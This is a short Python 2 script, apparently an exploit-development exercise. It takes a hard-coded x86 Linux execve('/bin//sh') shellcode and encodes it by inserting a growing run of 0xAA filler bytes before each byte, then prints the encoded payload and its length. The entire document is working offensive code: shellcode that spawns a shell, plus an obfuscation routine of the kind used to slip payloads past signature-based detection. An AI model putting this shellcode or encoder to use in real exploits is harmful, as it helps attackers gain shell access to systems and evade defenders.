import random
shellcode=("\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded= ""
encoded2= ""

print 'Encoded shellcode'
num=0
num1=0
for x in bytearray(shellcode):
    for i in xrange(num):
        encoded += '\\x%02x' % 0xAA
        encoded += ','
        num1 += 1
    encoded += '\\x'
    encoded += '%02x' % x
    encoded += ','
    num += 1
    num1 += 1
print encoded," ",num1
